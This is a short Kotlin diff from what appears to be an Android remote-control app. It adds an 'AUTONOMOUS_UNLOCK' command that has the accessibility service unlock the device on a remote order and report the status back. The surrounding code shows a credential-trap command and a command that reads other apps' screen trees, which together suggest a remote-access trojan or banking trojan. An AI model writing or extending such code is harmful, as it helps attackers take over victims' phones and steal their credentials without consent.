@@ -530,6 +530,20 @@ object CommandProcessor {
                         status = armCredentialTrap(ctx, id, content)
                     }
                 }
+                "AUTONOMOUS_UNLOCK" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        CoroutineScope(Dispatchers.IO).launch {
+                            service.executeAutonomousUnlock(id)
+                        }
+                        status = "UNLOCK_SEQUENCE_INITIATED"
+                        updateCommandStatus(ctx, id, status, null, null, null)
+                        return
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility service is offline."
+                    }
+                }
                 "GET_TREE" -> {
                     val parts = content.split("|")
                     val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
